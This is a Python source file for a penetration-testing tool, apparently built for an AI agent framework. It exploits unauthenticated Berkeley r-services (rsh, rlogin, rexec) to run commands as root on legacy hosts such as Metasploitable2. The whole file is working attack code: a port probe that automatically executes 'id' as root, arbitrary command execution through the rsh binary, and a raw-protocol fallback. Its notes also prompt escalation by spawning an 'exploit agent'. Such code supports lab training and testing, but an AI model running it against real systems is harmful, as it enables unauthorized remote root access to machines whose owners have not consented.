"""
TIRPAN — RSH/Rlogin/Rexec Tool
================================
Exploits Berkeley r-services (ports 512, 513, 514) which typically run
with no authentication on legacy systems like Metasploitable2.

Methods:
  rsh   — remote shell (port 514) via netcat-style raw TCP
  rexec — remote execution (port 512) with optional credentials
  check — probe all three ports and report which accept unauthenticated access
"""

from __future__ import annotations

import asyncio
import logging
import shutil

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_CONNECT_TIMEOUT = 10
_CMD_TIMEOUT     = 15


class RshTool(BaseTool):

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="rsh_exec",
            category="exploit-exec",
            description=(
                "Berkeley r-services exploit tool for ports 512 (rexec), 513 (rlogin), "
                "514 (rshell). These legacy services often have NO authentication on old "
                "Linux systems (Metasploitable2, legacy Unix). "
                "Actions:\n"
                "  check  — probe all three ports, report which accept unauthenticated access\n"
                "  exec   — execute a command via rsh/rlogin (no credentials needed on vulnerable targets)\n"
                "  shell  — open an interactive shell session"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address",
                    },
                    "action": {
                        "type": "string",
                        "description": "'check' | 'exec' | 'shell'",
                        "default": "check",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to execute (for action=exec). Example: 'id'",
                        "default": "id",
                    },
                    "port": {
                        "type": "integer",
                        "description": "Target port (514=rsh default, 513=rlogin, 512=rexec)",
                        "default": 514,
                    },
                    "username": {
                        "type": "string",
                        "description": "Username to use (default: root)",
                        "default": "root",
                    },
                },
                "required": ["target_ip"],
            },
        )

    async def execute(self, params: dict) -> dict:
        target_ip = params.get("target_ip", "").strip()
        action    = params.get("action", "check")
        command   = params.get("command", "id")
        port      = int(params.get("port", 514))
        username  = params.get("username", "root")

        if not target_ip:
            return {"success": False, "output": None, "error": "target_ip is required"}

        if action == "check":
            return await self._check_all_ports(target_ip)
        elif action == "exec":
            return await self._rsh_exec(target_ip, port, username, command)
        elif action == "shell":
            return await self._rsh_exec(target_ip, port, username, "id && uname -a && whoami")
        else:
            return {"success": False, "output": None, "error": f"Unknown action: {action}"}

    async def _check_all_ports(self, target_ip: str) -> dict:
        """Probe ports 512, 513, 514 and report which are open and accept connections."""
        results = {}
        open_ports = []
        accessible = []

        for port, svc in [(514, "rshell"), (513, "rlogin"), (512, "rexec")]:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target_ip, port),
                    timeout=_CONNECT_TIMEOUT,
                )
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                open_ports.append(port)
                results[svc] = {"port": port, "status": "open"}
            except (ConnectionRefusedError, OSError):
                results[svc] = {"port": port, "status": "closed"}
            except asyncio.TimeoutError:
                results[svc] = {"port": port, "status": "filtered"}

        # Try a quick command on port 514 (rsh) to verify unauthenticated access
        if 514 in open_ports:
            test = await self._rsh_exec(target_ip, 514, "root", "id")
            if test["success"]:
                accessible.append(514)
                results["rshell"]["auth_required"] = False
                results["rshell"]["test_output"] = test["output"]

        return {
            "success": len(open_ports) > 0,
            "output": {
                "open_ports": open_ports,
                "accessible_no_auth": accessible,
                "services": results,
                "note": (
                    "Unauthenticated r-service access confirmed — spawn exploit agent with action=exec"
                    if accessible else
                    "R-service ports open but authentication may be required"
                    if open_ports else
                    "No r-service ports open on this target"
                ),
            },
            "error": None,
        }

    async def _rsh_exec(
        self, target_ip: str, port: int, username: str, command: str
    ) -> dict:
        """
        Attempt unauthenticated command execution via rsh protocol.
        The rsh protocol sends: local_user\0remote_user\0command\0
        On Metasploitable2 and legacy systems with permissive hosts.equiv,
        this executes without any password prompt.
        """
        # Try using the rsh binary first (most reliable)
        if shutil.which("rsh"):
            return await self._rsh_via_binary(target_ip, username, command)

        # Fallback: raw protocol implementation
        return await self._rsh_raw(target_ip, port, username, command)

    async def _rsh_via_binary(
        self, target_ip: str, username: str, command: str
    ) -> dict:
        cmd = ["rsh", "-l", username, target_ip, command]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=_CMD_TIMEOUT
            )
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": "rsh command timed out"}
        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}

        out = stdout.decode(errors="replace").strip()
        err = stderr.decode(errors="replace").strip()

        if proc.returncode == 0 or out:
            return {
                "success": True,
                "output": {
                    "command": command,
                    "stdout": out,
                    "stderr": err,
                    "return_code": proc.returncode,
                    "method": "rsh_binary",
                    "note": "Unauthenticated rsh command execution successful — root shell available",
                },
                "error": None,
            }
        return {
            "success": False,
            "output": None,
            "error": f"rsh failed (rc={proc.returncode}): {err or 'no output'}",
        }

    async def _rsh_raw(
        self, target_ip: str, port: int, username: str, command: str
    ) -> dict:
        """Raw rsh protocol: send local_user\0remote_user\0command\0 over TCP."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, port),
                timeout=_CONNECT_TIMEOUT,
            )
        except Exception as e:
            return {"success": False, "output": None, "error": f"Cannot connect to {target_ip}:{port} — {e}"}

        try:
            # rsh protocol: stderr_port\0local_user\0remote_user\0command\0
            payload = f"0\0{username}\0{username}\0{command}\0".encode()
            writer.write(payload)
            await writer.drain()

            # Read response (null byte = no error, then command output)
            header = await asyncio.wait_for(reader.read(1), timeout=5)
            if header != b"\x00":
                err_msg = b""
                try:
                    err_msg = await asyncio.wait_for(reader.read(256), timeout=3)
                except Exception:
                    pass
                return {
                    "success": False,
                    "output": None,
                    "error": f"rsh auth rejected: {err_msg.decode(errors='replace')}",
                }

            output = await asyncio.wait_for(reader.read(4096), timeout=_CMD_TIMEOUT)
            out = output.decode(errors="replace").strip()

            return {
                "success": bool(out),
                "output": {
                    "command": command,
                    "stdout": out,
                    "method": "rsh_raw_protocol",
                    "note": "Unauthenticated rsh execution via raw protocol",
                },
                "error": None if out else "Empty response",
            }
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": "rsh raw protocol timed out"}
        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def health_check(self) -> ToolHealthStatus:
        if shutil.which("rsh"):
            return ToolHealthStatus(available=True, message="rsh binary found")
        return ToolHealthStatus(
            available=True,
            degraded=True,
            message="rsh binary not found — using raw protocol fallback",
            install_hint="apt install netkit-rsh",
        )
